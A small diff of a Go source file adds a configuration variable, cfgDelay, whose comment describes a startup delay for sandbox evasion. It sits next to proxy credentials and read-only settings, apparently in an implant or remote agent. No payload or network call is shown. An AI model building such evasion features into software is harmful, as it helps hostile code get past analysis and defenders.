@@ -21,6 +21,7 @@ var (
 	cfgProxyUser   string // proxy username
 	cfgProxyPass   string // proxy password
 	cfgReadOnly    string // "true" to reject write operations
+	cfgDelay       string // startup delay in seconds (sandbox evasion)
 	cfgVersion     string // version tag
 	cfgBuildCommit string // git short commit hash
 )
